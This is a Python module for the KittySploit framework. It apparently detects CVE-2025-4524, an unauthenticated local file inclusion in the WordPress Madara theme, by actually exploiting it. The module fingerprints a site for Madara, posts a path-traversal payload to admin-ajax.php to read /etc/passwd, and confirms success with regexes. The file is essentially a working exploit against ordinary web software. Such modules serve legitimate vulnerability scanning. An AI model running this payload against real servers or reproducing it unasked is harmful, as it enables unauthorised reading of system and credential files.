#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2025-4524 — Madara theme/plugin LFI via admin-ajax (madara_load_more)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client

# PoC fixe : template = path traversal vers /etc/passwd
_POST = {
    "action": "madara_load_more",
    "page": "1",
    "template": "plugins/../../../../../../../etc/passwd",
    "vars[orderby]": "meta_value_num",
    "vars[paged]": "1",
    "vars[timerange]": "",
    "vars[posts_per_page]": "16",
    "vars[tax_query][relation]": "OR",
    "vars[meta_query][0][relation]": "AND",
    "vars[meta_query][relation]": "AND",
    "vars[post_type]": "wp-manga",
    "vars[post_status]": "publish",
    "vars[meta_key]": "_latest_update",
    "vars[order]": "desc",
    "vars[sidebar]": "right",
    "vars[manga_archives_item_layout]": "big_thumbnail",
}


def _passwd_like(text: str) -> bool:
    """True si le corps ressemble à /etc/passwd (ligne root ou plusieurs entrées style passwd)."""
    if not text or len(text) < 40:
        return False
    if re.search(r"^root:[x*!]:0:0:", text, re.MULTILINE):
        return True
    lines = re.findall(
        r"(?m)^[a-z_][a-z0-9_-]{0,31}:[^:\r\n]+:\d+:\d+:",
        text[:12000],
        flags=re.IGNORECASE,
    )
    return len(lines) >= 3


class Module(Scanner, Http_client):

    __info__ = {
        "name": "WordPress Madara CVE-2025-4524 (LFI)",
        "description": (
            "Detects unauthenticated local file inclusion via the `madara_load_more` AJAX action "
            "(path traversal in the `template` parameter, Madara theme/plugin)."
        ),
        "author": "KittySploit Team",
        "severity": "high",
        "modules": [],
        "tags": [
            "web",
            "scanner",
            "wordpress",
            "lfi",
            "madara",
            "path-traversal",
            "cve-2025-4524",
        ],
    }

    def run(self):
        home = self.http_request(method="GET", path="/", allow_redirects=True)
        if not home:
            return False
        h = (home.text or "").lower()
        if "/wp-content/plugins/madara/" not in h and "madara-core" not in h and 'id="madara' not in h:
            return False

        r = self.http_request(
            method="POST",
            path="/wp-admin/admin-ajax.php",
            data=_POST,
            headers={
                "X-Requested-With": "XMLHttpRequest",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Accept": "*/*",
            },
            allow_redirects=False,
            timeout=15,
        )
        if not r or r.status_code not in (200, 500) or not _passwd_like(r.text or ""):
            return False

        self.set_info(
            severity="high",
            reason="Madara LFI (CVE-2025-4524): /etc/passwd-like content in response",
            cve="CVE-2025-4524",
        )
        return True
